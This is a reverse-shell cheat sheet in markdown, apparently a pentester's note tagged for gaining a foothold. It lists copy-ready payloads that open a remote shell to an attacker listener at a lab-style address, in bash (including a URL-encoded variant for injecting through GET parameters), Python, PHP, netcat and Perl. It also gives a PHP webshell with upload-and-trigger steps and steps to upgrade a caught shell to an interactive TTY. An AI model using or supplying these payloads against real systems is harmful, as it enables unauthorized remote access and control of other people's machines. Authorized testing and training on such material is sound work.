---
type: cheatsheet
phase: foothold
tags: [reverse-shell, shell, nc, bash, python, php, cheatsheet]
source: teamghsoftware/security-cheatsheets (adapted)
---

## Listener setup

```bash
nc -lvnp 4444
```

## Bash

```bash
bash -i >& /dev/tcp/10.10.16.x/4444 0>&1
```

URL-encoded version for GET parameter or Burp Repeater request line:
```
bash%20-i%20%3E%26%20/dev/tcp/10.10.16.x/4444%200%3E%261
```

> Always URL-encode when sending through a GET param. Unencoded special chars (`&`, `>`, spaces) break the HTTP request line and return 400. In Burp: select the value and Ctrl+U.

## Python 3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.16.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PHP webshell

Upload via file upload vuln, then trigger via browser/curl:

```php
<?php system($_GET['cmd']); ?>
```

```bash
curl "http://target/uploads/shell.php?cmd=id"
```

PHP one-liner reverse shell:
```php
php -r '$sock=fsockopen("10.10.16.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Netcat (without -e flag)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.x 4444 > /tmp/f
```

## Perl

```perl
perl -e 'use Socket;$i="10.10.16.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## TTY Upgrade

After catching any shell, upgrade to a full interactive TTY:

```bash
# Method 1
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Method 2 (better)
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# type: reset   ->  terminal type: xterm (or screen)
export TERM=xterm
export SHELL=bash
```

## msfvenom payloads

See [[msfvenom]] for generating standalone reverse shell executables, PHP files, WAR files, etc.

## Related
- [[netcat]]
- [[msfvenom]]
- [[Burp Suite]]
- [[Pentest Web Cheatsheet]]
